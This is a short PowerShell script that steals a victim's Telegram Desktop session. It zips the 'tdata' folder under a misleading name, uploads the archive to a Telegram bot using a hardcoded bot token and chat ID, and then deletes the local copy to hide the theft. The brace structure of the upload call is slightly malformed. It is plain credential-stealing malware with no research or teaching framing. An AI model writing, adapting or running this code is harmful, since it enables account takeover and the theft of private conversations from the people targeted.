$tdataPath = "$env:APPDATA\Telegram Desktop\tdata"
$zipPath = "$env:TEMP\system.zip"

if (Test-Path $tdataPath) {
Compress-Archive -Path $tdataPath -DestinationPath $zipPath -Force

$botToken= "8853091711:AAHXtKxyYTa91Xn0_Lgb4QXj0481ZRspQ4M "
$chatID = "8699240431"
$url = "https://api.telegram.org/bot$botToken/sendDocument"

Invoke-RestMethod -Uri $url -Method Post -Form @{

}
	chat_id = $chatID
	document = Get-Item $zipPath
}

Remove-Item $zipPath -Force
  